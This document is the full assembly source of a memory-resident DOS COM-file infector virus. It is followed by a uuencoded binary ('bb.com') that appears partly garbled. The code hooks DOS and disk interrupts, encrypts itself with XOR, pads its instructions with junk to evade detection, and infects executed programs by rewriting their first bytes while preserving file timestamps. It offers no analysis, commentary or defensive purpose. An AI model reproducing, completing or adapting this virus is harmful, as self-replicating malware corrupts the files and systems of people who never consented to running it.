code          segment
          assume cs:code,ds:code
          .radix 16
          org  100
start:
          push word ptr cs:[table+2]
          push cs
    inc ax
    dec ax
          pop  ds
          jmp  word ptr cs:[table]    ;go to module 1

curofs        dw   ?
files         db   0               ;number of infected files from this copy
fsize         dw   2               ;size of infected file
ftime         dw     ?
fdate         dw     ?
stdint21      dd     ?
oldint13      dd     ?
oldint21      dd     ?
oldint24      dd     ?

;------------- TABLE WITH MODULE PARAMETERS --------------------
table:
          dw   offset false_mod_1 ;00
          dw   offset mod_2       ;02
          dw   offset mod_3       ;04
          dw   offset mod_4       ;06          ;offset modules
          dw   offset mod_5       ;08
          dw   offset mod_6       ;0a
          dw   offset mod_7       ;0c
          dw   offset mod_8       ;0e

          dw   offset mod_2 - offset mod_1;10
          dw   offset mod_3 - offset mod_2;12
          dw   offset mod_4 - offset mod_3;14
          dw   offset mod_5 - offset mod_4;16
          dw   offset mod_6 - offset mod_5;18   ;size modules
          dw   offset mod_7 - offset mod_6;1a
          dw   offset mod_8 - offset mod_7;1c
          dw   offset myend - offset mod_8;1e


;------------- MODULE - 1 - CODER/DECODER ----------------------
mod_1:
          mov  bx,offset table+2   ;first module to working (module 2)
          mov  cx,6            ;number of modules to working
mod_1_lp1:
    inc ax
    dec ax
          cmp  bx,offset table+0a
          jne  mod_1_cont
          add  bx,2
mod_1_cont:
          push bx
          push cx
    inc ax
    inc ax
          mov  ax,[bx]         ;ax - offset module
          mov  cx,[bx+10]          ;cx - size of module
          mov  bx,ax
mod_1_lp2:
    inc ax
    dec ax  
        xor  byte ptr [bx],al
          inc  bx
          loop mod_1_lp2
          pop  cx
          pop  bx
    inc ax
    dec ax
          add  bx,2
          loop mod_1_lp1
          ret

;------------- MODULE - 2 - MUTATION TO MEMORY -----------------
mod_2:
             ;instalation check

          mov    es,cs:[2]                 ;memory size
          mov    di,100
          mov    si,100
    inc bx
    dec bx
          mov    cx,0bh
          repe   cmpsb
          jne    mod_2_install             ;jump if not install
          jmp    word ptr cs:[table+06]  ;if install, jump to module 4

    inc di
    dec di
mod_2_install:
             ;instalation

          mov    ax,cs
          dec    ax
          mov    ds,ax
    inc ax
    dec ax
          cmp    byte ptr ds:[0],'Z'
          je     mod_2_cont

    inc ax
    dec ax
          jmp    word ptr cs:[table+6]      ;if no last MCB - go to mod4

mod_2_cont:
          sub    word ptr ds:[3],0c0
          mov    ax,es
          sub    ax,0c0
          mov    es,ax
          mov    word ptr ds:[12],ax       ;decrement memory size with 2K
          push   cs
          pop    ds

mod_2_mut:
          mov  byte ptr cs:files,0

          mov  di,100
          mov  cx,offset mod_1-100
          mov  si,100
          rep  movsb     ;write table to new memory

          mov  bx,word ptr cs:[table]
    inc si
    dec si
          add  bx,offset mod_1_lp2-offset mod_1+1
          xor  byte ptr [bx],18            ;change code method

          mov  cx,8
          mov  word ptr curofs,offset mod_1
mod_2_lp1:
          push cx
          call mod_2_rnd ;generate random module addres
          push bx        ;addres in table returned from mod_2_rnd
          mov  ax,[bx]   ;offset module
          push ax
          add  bx,10
          mov  cx,[bx]   ;length of module
          pop  si
    inc bx
          pop  bx
          xchg di,curofs
          mov  word ptr es:[bx],di ;change module offset in table
          rep  movsb           ;copy module to new memory
          xchg di,curofs           ;change current offset in new memory
          mov  ax,8000
          or   word ptr [bx],ax    ;mark module - used
          pop  cx
          loop mod_2_lp1
    inc cl
          mov  cl,8
          not  ax
          mov  bx,offset table
mod_2_lp2:
          and  word ptr [bx],ax    ;unmark all modules
          add  bx,2
          loop mod_2_lp2

          jmp  word ptr cs:[table+4]  ;go to module 3

mod_2_rnd:
          push cx
          push es
          xor  cx,cx
          mov  es,cx
mod_2_lp3:
          mov  bx,es:[46c]
          db 81,0e3,07,00  ;and bx,7
          shl  bx,1
          add  bx,offset table
          test [bx],8000
          jnz  mod_2_lp3
          pop  es
          pop  cx
          ret

;------------- MODULE - 3 - SET INTERRUPT VECTORS ---------------
mod_3:
          xor    ax,ax
          mov    ds,ax

          mov    ax,ds:[4*21]
          mov    word ptr es:[oldint21],ax
    dec ax
          mov    ax,ds:[4*21+2]
          mov    word ptr es:[oldint21+2],ax

          mov    ah,31
    dec ah
          int    21
          cmp    ax,1e03
          jne    mod_3_getvec

          mov    word ptr es:[stdint21],1460
          mov    ax,1202
          push   ds
    inc ax
          int    2f
          mov    word ptr es:[stdint21+2],ds
          pop    ds
          jmp    mod_3_setvec

mod_3_getvec:
          mov    ax,ds:[4*21]
          mov    word ptr es:[stdint21],ax
          mov    ax,ds:[4*21+2]
          mov    word ptr es:[stdint21+2],ax

mod_3_setvec:
          cli
          mov    ax,word ptr es:[table+0c]
          mov    ds:[4*21],ax
    add ax,13
          mov    ax,es
          mov    ds:[4*21+2],ax
          sti

          mov    cx,es
          mov    ah,13           ;
          int    2f              ;
          push   es              ;
          mov    es,cx           ;
          mov    word ptr es:[oldint13],dx   ; get standart int13 addres
          mov    word ptr es:[oldint13+2],ds ;
    inc ax
          pop    es              ;
    dec ax
          int    2f              ;

          jmp    word ptr cs:[table+06]           ;go to module 4

;------------- MODULE - 4 - RESTORE OLD PROGRAM CODE & START ----
mod_4:
          push   cs
          push   cs
          pop    ds
          pop    es
          mov    si,word ptr cs:[table+06]
          add    si,offset mod_4_cont - offset mod_4
    inc di
          mov    di,cs:fsize
          add    di,offset myend+1
          push   di
          mov    cx,offset mod_5 - offset mod_4_cont
          cld
          rep    movsb
          ret
mod_4_cont:
          mov    si,cs:fsize
          add    si,100

          cmp    si,offset myend+1
          jnc    mod_4_cnt
          mov    si,offset myend+1
mod_4_cnt:
          mov    di,100
          mov    cx,offset myend-100
          rep    movsb
          mov    ax,101   ;
    dec ax
          push   ax       ; jmp 100
          ret         ;

;------------- MODULE - 5 - SPECIAL PROGRAM ---------------------
mod_5:
          xor    di,di
          mov    ds,di
          cli
          mov    di,word ptr cs:[oldint21]
          mov    ds:[4*21],di
    inc di
          mov    di,word ptr cs:[oldint21+2]
          mov    ds:[4*21+2],di
          sti

          ret

          db     'Pile of shit   '
;------------- MODULE - 6 - INT 24 HEADER -----------------------
mod_6:
          mov    al,3
          iret
          db     'The Worthless Piece of shit vi-rus that is a joke  ',0

;------------- MODULE - 7 - INT 21 HEADER -----------------------
mod_7:
          push   bx
          push   si
          push   di
          push   es
          push   ax

          cmp    ax,4b00
          je     mod_7_begin
          jmp    mod_7_exit
mod_7_begin:
          push   ds
          push   cs                    ;
          pop    es                    ;
          xor    ax,ax                 ;
          mov    ds,ax                 ;
    mov si,69
          mov    si,4*24                   ;
          mov    di,offset oldint24            ;
          movsw                    ;   change int24 vector
          movsw                    ;
          mov    ax,word ptr cs:[table+0a]         ;
          cli
          mov    ds:[4*24],ax              ;
    mov ax,69
          mov    ax,cs                 ;
          mov    ds:[4*24+2],ax            ;
          sti
          pop    ds

          mov    ax,3d00                   ;
          pushf                    ;
          call   cs:oldint21               ;
          jc     mod_7_ex                  ; open,infect,close file
          mov    bx,ax                 ;
mod_7_infect:                          ;
          call   word ptr cs:[table+0e]        ;
          pushf
          mov    ah,3f
    dec ah                 ;
          pushf                    ;
          call   cs:oldint21               ;
          popf
          jc     mod_7_ex

          push   ds              ;
          cli                ;
          xor    ax,ax           ;
          mov    ds,ax           ;
          mov    ax,word ptr cs:[oldint13]   ;
          xchg   ax,word ptr ds:[4*13]   ;
          mov    word ptr cs:[oldint13],ax   ; exchange int13 vectors
    mov ax,69
          mov    ax,word ptr cs:[oldint13+2] ;
          xchg   ax,word ptr ds:[4*13+2]     ;
          mov    word ptr cs:[oldint13+2],ax ;
          sti                ;
          pop    ds              ;
mod_7_ex:
          push   ds                    ;
          xor    ax,ax                 ;
          mov    ds,ax                 ;
          mov    ax,word ptr cs:oldint24           ;
          mov    ds:[4*24],ax              ;
    mov ax,69
          mov    ax,word ptr cs:oldint24+2         ; restore int24 vector
          mov    ds:[4*24+2],ax            ;
          pop    ds                    ;

mod_7_exit:
          pop    ax
          pop    es
          pop    di
          pop    si
          pop    bx

          jmp    cs:oldint21

;------------- MODULE - 8 - INFECTING (bx - file handle) --------
mod_8:
          push   cx
          push   dx
          push   ds
          push   es
          push   di
          push   bp

          push   bx
          mov    ax,1221
    dec ax
          int    2f
          mov    bl,es:[di]
          xor    bh,bh
          mov    ax,1216
          int    2f
          pop    bx

          mov    ax,word ptr es:[di+11]
          cmp    ax,0f000
          jc     mod_8_c
          jmp    mod_8_exit

mod_8_c:
          mov    word ptr es:[di+2],2          ;open mode - R/W

    mov ax,69
          mov    ax,es:[di+11]
          mov    cs:fsize,ax           ; save file size

          mov    ax,word ptr es:[di+0dh]   ;

          mov    word ptr cs:[ftime],ax    ; save file date/time
    mov ax,69
          mov    ax,word ptr es:[di+0f]    ;
          mov    word ptr cs:[fdate],ax    ;

          push   cs              ;
          pop    ds              ;
          mov    dx,offset myend+1       ;
          mov    cx,offset myend-100     ; read first bytes
          mov    ah,3f           ;
          pushf
    nop
              call   cs:oldint21
          jnc    mod_8_cnt
          jmp    mod_8_exit

mod_8_cnt:
          mov    bp,ax           ; ax - bytes read
          mov    si,dx
          mov    ax,'MZ'
    nop   
       cmp    ax,word ptr ds:[si]
          jne    mod_8_nxtchk
          jmp    mod_8_exit
mod_8_nxtchk:
          xchg   ah,al
    nop
          cmp    ax,ds:[si]
          jne    mod_8_cnt2
          jmp    mod_8_exit

mod_8_cnt2:
          push   es
          push   di
          push   cs              ;
    nop   
       pop    es             ;
          mov    si,100          ;
          mov    di,dx           ; check for infected file
    nop
          mov    cx,0bh          ;
          repe   cmpsb           ;

    nop 
          pop    di
          pop    es
          jne    mod_8_cnt1          ;
          jmp    mod_8_exit
mod_8_cnt1:
          mov    word ptr es:[di+15],0     ; fp:=0

          push   es
          push   di
          mov    si,word ptr cs:[table+0e]
          add    si,offset mod_8_cont - offset mod_8
          xor    di,di
          push   cs
    nop
          pop    es
          mov    cx,offset mod_8_cont_end - offset mod_8_cont
          cld
          rep    movsb
          pop    di
          pop    es

    nop
          mov    si,word ptr cs:[table+0e]
          add    si,offset mod_8_cont_end - offset mod_8
          push   si
          xor    si,si
          push   si

          push   ds              ;
          cli                ;
    nop
          xor    ax,ax           ;
          mov    ds,ax           ;
          mov    ax,word ptr cs:[oldint13]   ;
          xchg   ax,word ptr ds:[4*13]   ;
          mov    word ptr cs:[oldint13],ax   ;
    nop
          mov    ax,word ptr cs:[oldint13+2] ; exchange int13 vectors
          xchg   ax,word ptr ds:[4*13+2]     ;
    nop  
        mov    word ptr cs:[oldint13+2],ax ;
          sti                ;
          pop    ds              ;

          ret

mod_8_cont:
          push   bx
    nop
          call   word ptr cs:[table]     ; code virus
          pop    bx

          mov    dx,100          ;
          mov    ah,40           ; write code in begin
          mov    cx,offset myend-0ff
          pushf              ;
          call   cs:stdint21         ;

          pushf
          push   bx
    nop
          call   word ptr cs:[table]     ; decode virus
          pop    bx
          popf
          jnc    mod_8_cont1
          pop    ax
    nop
          mov    ax,word ptr cs:[table+0e]
          add    ax,offset mod_8_ext - offset mod_8
          push   ax
          ret
mod_8_cont1:
          mov    ax,es:[di+11]       ; fp:=end of file
          mov    word ptr es:[di+15],ax  ;

          mov    dx,offset myend+1
    nop
          mov    cx,bp           ; bp - files read
          mov    ah,40           ;
          pushf              ;
          call   cs:stdint21         ; write in end of file

          ret

mod_8_cont_end:
          mov    ax,5701     ;
    nop
          mov    cx,cs:ftime ;
          mov    dx,cs:fdate ; restore file date/time
          pushf      ;
          call   cs:oldint21 ;

          inc    cs:files
          cmp    cs:files,0a
    nop
          jne    mod_8_ext
          call   word ptr cs:[table+8]
          jmp    short mod_8_ext
mod_8_exit:
          stc
          jmp    short mod_8_ex
mod_8_ext:
          clc
mod_8_ex:
          pop    bp
          pop    di
          pop    es
          pop    ds
          pop    dx
          pop    cx
          ret

;---------------------------------------------------------------

myend         db   0

          int    20            ;code of infected file

false_mod_1:
          mov     word ptr cs:[table],offset mod_1
          ret

code          ends
          end  start

begin 775 bb.com
M+O\V*0$.0$@?+O\F)P$````"````````````````````````````-05T`38"
MIP+F`@\#1@/;`RT`P@!Q`#\`*0`W`)4`5P&[*0&Y!@!`2('[,0%U`X/#`E-1
M0$"+!XM/$(O80$@P!T/B^5E;0$B#PP+BVL,NC@8"`+\``;X``4-+N0L`\Z9U
M!R[_)BT!1T^,R$B.V$!(@#X``%IT!T!(+O\F+0&!+@,`P`",P"W``([`HQ(`
M#A\NQ@80`0"_``&Y1P"^``'SI"Z+'B<8N0@`QP8.`4@V
M`%.+!U"#PQ"+#UY#6X<^#@$FB3_SI(<^#@&X`(`)!UGBV_[!L0CWT+LG`2$'
M@\,"XODN_R8K`5$&,\F.P2:+'FP$@>,'`-'C@<,G`?<'`(!UZP=9PS/`CMBA
MA``FHQ\!2*&&`":C(0&T,?[,S2$]`QYU%R;'!A0,TO)HP>&0$?
MZP^0H80`)J,7`:&&`":C&0'Z)J$S`:.$``43`(S`HX8`^XS!M!/-+P:.P2:)
M%AL!)HP>'0%`!TC-+R[_)BT!#@X?!RZ+-BT!@<8?`$<8``8'^,P5S`[XS!;\``;DR!/.DN`$!2%##,_^.W_HNBSX?
M`8D^A`!'+HL^(0&)/H8`^\-0:6QE(&]F('-H:70@(""P`\]4:&4@5V]R=&AL
M97-S(%!I96-E(&]F('-H:70@=FDM<&
M3``NHQL!N&D`+J$=`8<&3@`NHQT!^Q\>,\".V"ZA(P&CD`"X:0`NH24!HY(`
M'U@'7UY;+O\N'P%14AX&5U53N"$22,TO)HH=,O^X%A+-+ULFBT41/0#P<@/I
M*`$FQT4"`@"X:0`FBT41+J,1`2:+10TNHQ,!N&D`)HM%#RZC%0$.'[HS!;DR
M!+0_G)`N_QX?`7,#Z>X`B^B+\KA:39`[!'4#Z=\`AN"0.P1U`^G5``97#I`'
MO@`!B_J0N0L`\Z:07P=U`^F]`";'114```97+HLV-0&!QM\`,_\.D`>Y1`#\
M\Z1?!Y`NBS8U`8'&(P%6,_96'OJ0,\".V"ZA&P&'!DP`+J,;`9`NH1T!AP9.
M`)`NHQT!^Q_#4Y`N_Q8G`5NZ``&T0+DS!)PN_QX7`9Q3D"[_%B<.X`5>0+HL.$P$NBQ85
M`9PN_QX?`2[^!A`!+H`^$`$*D'4*+O\6+P'K`_GK`?A=7P
 
